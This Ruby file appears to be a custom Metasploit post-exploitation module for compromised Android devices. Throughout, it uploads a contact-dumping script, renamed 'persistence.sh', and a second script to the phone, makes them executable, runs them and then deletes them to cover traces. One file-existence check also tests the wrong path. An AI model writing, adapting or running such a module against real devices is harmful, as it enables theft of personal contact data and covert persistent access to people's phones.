# usr/share/metasploit_framework/modules/post/android/manage/upload_and_execute.rb
class MetasploitModule < Msf::Post
    Rank = NormalRanking
  
    include Msf::Post::Common
    include Msf::Post::Android::System
  
    def initialize(info = {})
      super(update_info(info,
        'Name'         => 'Upload and Execute Android Script',
        'Description'  => %q{
          This module uploads dumpcontact.sh and script.sh to an Android device and executes it.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['sagar'],
        'Platform'     => ['android'],
        'SessionTypes' => ['meterpreter']
      ))
  
  
    register_options(
      [
        OptString.new('LOCAL_SCRIPT1', [true, 'Path to the local script to upload', '/home/ghost/Desktop/MSF_AUTO/dumpccontact.sh']),
        #OptString.new('REMOTE_PATH1', [true, 'Remote path to upload the script to', '']),
        OptString.new('LOCAL_SCRIPT2', [true, 'Path to the local script to upload', '/home/ghost/Desktop/MSF_AUTO/script.sh']),
        #ptString.new('REMOTE_PATH2', [true, 'Remote path to upload the script to', ''])
      ]
    )
    end
  
    def run
     # Get the current working directory on the target
      print_status("Retrieving current working directory on target...")
      remote_pwd = cmd_exec('pwd').strip
  
      if remote_pwd.nil? || remote_pwd.empty?
        print_error("Failed to retrieve current working directory. Aborting.")
        return
      end
  
      print_good("Current working directory on target: #{remote_pwd}")
   # First Script
      local_script1 = datastore['LOCAL_SCRIPT1']
      #remote_path1 = datastore['REMOTE_PATH1']
      remote_path1 = "#{remote_pwd}/persistence.sh"
  
      print_status("Uploading #{local_script1} to #{remote_path1} on the target device...")
      upload_result1 = upload_file(remote_path1, local_script1)
      
      if upload_result1
        print_good("File uploaded successfully: #{local_script1} to #{remote_path1}")
      else
        print_error("Failed to upload #{local_script1} to #{remote_path1}")
        return
      end
       # Verify that the file exists on the target
      print_status("Verifying file existence...")
      result = cmd_exec("ls -la \"#{remote_path1}\"")
    
      if result.include?(remote_path1)
        print_good("File exists on target: #{remote_path1}")
      else
        print_error("File not found on target: #{remote_path1}")
        return
      end
        print_status("Setting execute permissions on #{remote_path1}...")
        result = cmd_exec("chmod 755 \"#{remote_path1}\"")
        print_status("chmod result: #{result}")
    
        print_status("Executing the script #{remote_path1}...")
        result1 = cmd_exec("sh \"#{remote_path1}\"")
    
        if result1
          print_good("First script executed successfully: #{result1}")
    
          # Second Script
          local_script2 = datastore['LOCAL_SCRIPT2']
          #remote_path2 = datastore['REMOTE_PATH2']
          remote_path2 = "#{remote_pwd}/script.sh"
    
          print_status("Uploading #{local_script2} to #{remote_path2} on the target device...")
          upload_result2 = upload_file(remote_path2, local_script2)
    
           if upload_result2
        print_good("File uploaded successfully: #{local_script2} to #{remote_path2}")
      else
        print_error("Failed to upload #{local_script2} to #{remote_path2}")
        return
      end
           # Verify that the file exists on the target
      print_status("Verifying file existence...")
      result = cmd_exec("ls -la \"#{remote_path2}\"")
    
      if result.include?(remote_path1)
        print_good("File exists on target: #{remote_path2}")
      else
        print_error("File not found on target: #{remote_path2}")
        return
      end
    
          print_status("Setting execute permissions on #{remote_path2}...")
          result = cmd_exec("chmod 755 \"#{remote_path2}\"")
          print_status("chmod result: #{result}")
    
          print_status("Executing the script #{remote_path2}...")
          result2 = cmd_exec("sh \"#{remote_path2}\"")
    
          if result2
            print_good("Second script executed successfully: #{result2}")
          else
            print_error("Failed to execute the second script.")
          end
        else
          print_error("Failed to execute the first script. Aborting.")
        end
    
        # Optional: Clean up by removing the scripts after execution
        cmd_exec("rm \"#{remote_path1}\"")
        cmd_exec("rm \"#{remote_path2}\"")
       end
      end
    end